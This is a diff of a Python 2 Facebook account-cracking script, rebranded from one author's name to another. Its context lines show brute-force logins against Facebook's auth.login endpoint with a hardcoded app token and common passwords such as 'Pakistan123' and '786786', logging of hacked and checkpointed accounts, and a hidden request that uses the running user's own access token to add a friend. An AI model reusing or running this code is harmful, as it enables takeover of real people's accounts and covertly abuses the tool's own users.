@@ -1,8 +1,8 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Tech-Qaiser
+#The Credit For This Code Goes To Alone codr shadow hacker
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020
+#Reserved2021
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
 from multiprocessing.pool import ThreadPool
@@ -49,18 +49,30 @@ def jalan(z):
 
 logo = """
 \033[0;35m╭━━━╮
-\033[0;35m┃╭━╮┃
-\033[0;35m┃┃╱┃┣━━┳┳━━┳━━┳━╮\033[0;31mUPDATED V+FIXED
-\033[0;35m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[0;35m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[0;35m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[0;35m         ╰╯
+\033[0;35m
 
-\033[1;91m--> \033[4;3;92mGITHUB\033[1;0m :- \033[0;34mhttps://github.com/TechQaiser
+░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗
 
-\033[1;92m-->\033[4;3;92m FACEBOOK\033[1;0m :-\033[0;34m Qaiser Abbas
+██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║
 
-\033[1;93m--> \033[4;3;92mYOUTUBE\033[1;0m :-  \033[0;34mTech Qaiser
+╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝
+
+░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░
+
+██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░
+
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░
+\033[0;35m\033[0;31mUPDATED V+FIXED
+\033[0;35m
+\033[0;35m
+\033[0;35m
+\033[0;35m         
+
+\033[1;91m--> \033[4;3;92mGITHUB\033[1;0m :- \033[0;34mhttps://github.com/abicreation
+
+\033[1;92m-->\033[4;3;92m FACEBOOK\033[1;0m :-\033[0;34m Shadow hacker
+
+\033[1;93m--> \033[4;3;92mYOUTUBE\033[1;0m :-  \033[0;34mMr Hacker
 
 \033[1;94m--> \033[4;3;92mDISCLAIMER\033[1;0m:-\033[0;34m This Tool Is only for Educational Purposes I am not responsible for any miss use
 
@@ -85,27 +97,37 @@ vulnot = '\x1b[31mNot Vuln'
 vuln = '\x1b[32mVuln'
 os.system('clear')
 print """
-\033[0;35m╭━━━╮
-\033[0;35m┃╭━╮┃
-\033[0;35m┃┃╱┃┣━━┳┳━━┳━━┳━╮\033[0;31mUPDATED V+FIXED
-\033[0;35m┃┃╱┃┃╭╮┣┫━━┫┃━┫╭╯
-\033[0;35m┃╰━╯┃╭╮┃┣━━┃┃━┫┃
-\033[0;35m╰━━╮┣╯╰┻┻━━┻━━┻╯
-\033[0;35m         ╰╯
+\033[0;35m╭
 
-\033[1;91m--> \033[4;3;92mGITHUB\033[1;0m :- \033[0;34mhttps://github.com/TechQaiser
+░██████╗██╗░░██╗░█████╗░██████╗░░█████╗░░██╗░░░░░░░██╗
 
-\033[1;92m-->\033[4;3;92m FACEBOOK\033[1;0m :-\033[0;34m Qaiser Abbas
+██╔════╝██║░░██║██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║
 
-\033[1;93m--> \033[4;3;92mYOUTUBE\033[1;0m :-  \033[0;34mTech Qaiser
+╚█████╗░███████║███████║██║░░██║██║░░██║░╚██╗████╗██╔╝
+
+░╚═══██╗██╔══██║██╔══██║██║░░██║██║░░██║░░████╔═████║░
+
+██████╔╝██║░░██║██║░░██║██████╔╝╚█████╔╝░░╚██╔╝░╚██╔╝░
+
+╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░░░╚═╝░░░╚═╝░░\033[0;31mUPDATED V+FIXED
+\033[0;35m
+\033[0;35m
+\033[0;35m
+\033[0;35m         
+
+\033[1;91m--> \033[4;3;92mGITHUB\033[1;0m :- \033[0;34mhttps://github.com/abicreation
+
+\033[1;92m-->\033[4;3;92m FACEBOOK\033[1;0m :-\033[0;34m shadow hacker
+
+\033[1;93m--> \033[4;3;92mYOUTUBE\033[1;0m :-  \033[0;34mMr hacker
 
 \033[1;94m--> \033[4;3;92mDISCLAIMER\033[1;0m:-\033[0;34m This Tool Is only for Educational Purposes I am not responsible for any miss use
 
 
 """
 
-CorrectUsername = 'Qaiser'
-CorrectPassword = 'Child'
+CorrectUsername = 'Shadow'
+CorrectPassword = 'Hacker'
 
 loop = 'true'
 while loop == 'true':
@@ -117,10 +139,10 @@ while loop == 'true':
             loop = 'false'
         else:
             print 'Wrong Password'
-            os.system('xdg-open https://youtu.be/bnitNSNYX5o')
+            os.system('xdg-open https://youtu.be/Ck5aNWX65kM')
     else:
         print 'Wrong Username'
-        os.system('xdg-open https://youtu.be/bnitNSNYX5o')
+        os.system('xdg-open https://youtu.be/Ck5aNWX65kM')
 ##### LICENSE #####
 #=================#
 def lisensi():
@@ -192,7 +214,7 @@ def login():
                 unikers.write(z['access_token'])
                 unikers.close()
                 print '\n\x1b[1;36;40m[\xe2\x9c\x93] Login Done \xf0\x9f\x94\x93\xe2\x9a\xa1'
-                os.system('xdg-open https://www.youtube.com/channel/UCSBPlrPsjLLXC3HFFx9jl_Q')
+                os.system('xdg-open https://www.youtube.com/channel/Ck5aNWX65kM')
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 menu()
             except requests.exceptions.ConnectionError:
@@ -421,7 +443,7 @@ def pilih_super():
                         cek.close()
                         cekpoint.append(user + pass3)
                     else:
-                        pass4 = '786786'
+                        pass4 = 'Pakistan123'
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
@@ -436,7 +458,7 @@ def pilih_super():
                             cek.close()
                             cekpoint.append(user + pass4)
                         else:
-                            pass5 = '000786'
+                            pass5 = '786786'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
